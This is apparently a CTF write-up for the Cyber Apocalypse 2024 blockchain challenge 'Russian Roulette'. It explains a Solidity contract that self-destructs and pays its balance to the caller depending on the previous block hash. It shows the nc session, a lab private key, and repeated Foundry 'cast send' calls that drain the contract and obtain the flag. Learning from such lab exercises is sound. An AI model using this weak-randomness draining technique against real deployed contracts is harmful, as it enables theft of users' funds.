---
title: "Russian Roulette - Cyber Apocalypse 2024: Hacker Royale"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["blockchain", "solidity", "foundry", "russian", "roulette", "smart-contract", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "We are given a Solidity file called RussianRoulette.sol:"
source:
  name: "CTFtime writeup #38995"
  url: "https://ctftime.org/writeup/38995"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Russian Roulette"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Russian Roulette
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/38995>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/>

---
We are given a Solidity file called `RussianRoulette.sol`:

`

```
    pragma solidity 0.8.23;
    
    contract RussianRoulette {
    
        constructor() payable {
            // i need more bullets
        }
    
        function pullTrigger() public returns (string memory) {
            if (uint256(blockhash(block.number - 1)) % 10 == 7) {
                selfdestruct(payable(msg.sender)); // 💀
            } else {
                return "im SAFU ... for now";
            }
        }
    }
```

`

Moreover, we have this `Setup.sol`, which is common in Solidity challenges:

`

```
    pragma solidity 0.8.23;
    
    import {RussianRoulette} from "./RussianRoulette.sol";
    
    contract Setup {
        RussianRoulette public immutable TARGET;
    
        constructor() payable {
            TARGET = new RussianRoulette{value: 10 ether}();
        }
    
        function isSolved() public view returns (bool) {
            return address(TARGET).balance == 0;
        }
    }
```

`

Here we see that the remote instance has deployed a `RussianRoulette` Smart Contract with `10 ether`, and we will solve the challenge if the Smart Contract runs out of balance.

## Block hash

In order to make the `RussianRoulette` Smart Contract run out of money, we need to force `pullTrigger` to execute `selfdestruct`:

`

```
        function pullTrigger() public returns (string memory) {
            if (uint256(blockhash(block.number - 1)) % 10 == 7) {
                selfdestruct(payable(msg.sender)); // 💀
            } else {
                return "im SAFU ... for now";
            }
        }
```

`

As can be seen, `selfdestruct` is called when the hash of the previous block is `7` modulo `10` (in other words, the last decimal digit is a `7`). So, we only need to perform several transactions until we have this situation:

## Exploitation

Let’s connect to the challenge instance to take the connection parameters:

`

```
    $ nc 94.237.59.113 42894
    1 - Connection information
    2 - Restart Instance
    3 - Get flag
    action? 1
    
    Private key     :  0xbe0862385b45fce1eef2af091e4f0386473b8d69bf14a291cb55f61a248aff31
    Address         :  0xeb08e072B62AEc041d96cB3f06206cE7c455ff5c
    Target contract :  0x9A69BbA55b2E28F53465F0B8cEB8Cd4E16081D64
    Setup contract  :  0x80Ff54067a7a9216EB998729356a776Dc3c30555
    ^C
    
    $ PRIVATE_KEY='0xbe0862385b45fce1eef2af091e4f0386473b8d69bf14a291cb55f61a248aff31'
    
    $ ADDRESS_TARGET='0x9A69BbA55b2E28F53465F0B8cEB8Cd4E16081D64'
    
    $ ADDRESS_SETUP='0x80Ff54067a7a9216EB998729356a776Dc3c30555'
    
    $ export ETH_RPC_URL='http://94.237.59.113:43194'
```

`

Now we are ready to use `cast`:

`

```
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    false
```

`

At this point, we can start doing transactions until the block hash matches the condition:

`

```
    $ cast send $ADDRESS_TARGET 'pullTrigger()' --private-key $PRIVATE_KEY
    
    blockHash               0xe38c2717f3941617e4128b7bd7466d0053a0fa345ab06407d432e51805cc82ec
    blockNumber             2
    contractAddress
    cumulativeGasUsed       21720
    effectiveGasPrice       3000000000
    from                    0xeb08e072B62AEc041d96cB3f06206cE7c455ff5c
    gasUsed                 21720
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root
    status                  1
    transactionHash         0xcd98670c9f7ce46f14d600e3dd0b277aec5b07030514795a48e09509ece65309
    transactionIndex        0
    type                    2
    to                      0x9a69…1d64
    depositNonce             null
    
    $ python3 -c 'print(0xe38c2717f3941617e4128b7bd7466d0053a0fa345ab06407d432e51805cc82ec % 10)'
    0
    
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    false
```

`

The above one does not match, but after a few transactions, we find one that will work:

`

```
    $ cast send $ADDRESS_TARGET 'pullTrigger()' --private-key $PRIVATE_KEY
    
    blockHash               0xc85e094b5ba8e051839702a412ae5748d7197799e5036d63169ae5e76a0c1ca7
    blockNumber             4
    contractAddress
    cumulativeGasUsed       21720
    effectiveGasPrice       3000000000
    from                    0xeb08e072B62AEc041d96cB3f06206cE7c455ff5c
    gasUsed                 21720
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root
    status                  1
    transactionHash         0x8f160619e48065441abd033b6c8c2c882a55870ca8fa67ec2f6ece0082369070
    transactionIndex        0
    type                    2
    to                      0x9a69…1d64
    depositNonce             null
    
    $ python3 -c 'print(0xc85e094b5ba8e051839702a412ae5748d7197799e5036d63169ae5e76a0c1ca7 % 10)'
    7
```

`

So, we need to call `pullTrigger` again and we are done:

`

```
    $ cast send $ADDRESS_TARGET 'pullTrigger()' --private-key $PRIVATE_KEY
    
    blockHash               0x7ec35efac3a32dfb53355d71c0db0f66f1639649d68d1f62997d338a740b87c2
    blockNumber             5
    contractAddress
    cumulativeGasUsed       26358
    effectiveGasPrice       3000000000
    from                    0xeb08e072B62AEc041d96cB3f06206cE7c455ff5c
    gasUsed                 26358
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root
    status                  1
    transactionHash         0xa66ba46f2cee0d2e65b8da44b80a18ee35989caef4dddf7f1a7fd1a71e0e9a21
    transactionIndex        0
    type                    2
    to                      0x9a69…1d64
    depositNonce             null
    
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    true
```

`

## Flag

And this is the flag:

`

```
    $ nc 94.237.59.113 42894
    1 - Connection information
    2 - Restart Instance
    3 - Get flag
    action? 3
    HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}
```

`
